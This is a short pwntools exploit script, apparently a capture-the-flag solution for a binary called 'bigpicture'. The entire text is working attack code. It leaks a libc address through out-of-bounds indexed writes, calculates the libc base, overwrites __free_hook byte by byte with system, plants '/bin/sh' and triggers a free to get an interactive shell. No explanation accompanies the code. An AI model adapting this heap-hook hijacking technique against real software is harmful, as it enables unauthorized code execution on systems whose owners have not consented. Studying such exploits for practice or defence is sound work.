from pwn import *

p = process('./bigpicture')
p.clean()

freehook_offset = -2103432
GI_offset = 2010560+1881216
GI_get = -2113464

p.sendline("1 x 135138")

p.clean()
buf = ""
for i in xrange(6):
    p.sendline("0, %d, A" %(GI_get+i))
    p.readuntil("overwriting ")
    buf += p.readline()[0]

print hex(u64(buf + "\x00"*2))   
libcBase = u64(buf + "\x00"*2) - GI_offset
print hex(libcBase)

libc = p.libc
libc.base = libcBase

system = p64(libc.symbols["system"])

for i in xrange(8):
    p.sendline("0, %d, %c" %(freehook_offset+i,system[i]))

binsh = "/bin/sh"

for i in xrange(len(binsh)):
    p.sendline("0, %d, %c" %(i,binsh[i]))

p.sendline("asdagh")    

p.interactive()
